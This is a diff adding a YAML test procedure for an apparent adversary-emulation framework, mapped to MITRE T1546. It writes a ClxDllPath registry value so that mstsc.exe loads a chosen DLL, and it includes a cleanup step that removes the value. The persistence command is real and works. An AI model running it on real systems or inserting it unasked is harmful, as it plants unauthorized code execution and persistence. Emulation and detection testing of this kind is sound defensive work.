@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: Load custom DLL on mstsc execution
+description: |
+    Adding ClxDllPath under Terminal Server Client subkey of HKLM hive with a path to custom DLL allows for DLL loading during execution of mstsc.exe
+args:
+    - name: dll_inf
+      type: Path
+      default: C:\Windows\System32\amsi.dll
+uuid: 2db7852e-5a32-4ec7-937f-f4e027881700
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: load-custom-dll-on-mstsc-execution
+      inline: |
+        reg add "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /t REG_SZ /d "{{.Args.dll_inf}}" /f
+      executor: command_prompt
+      cleanup:
+        inline: 'reg delete "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /f      '
+        executor: command_prompt
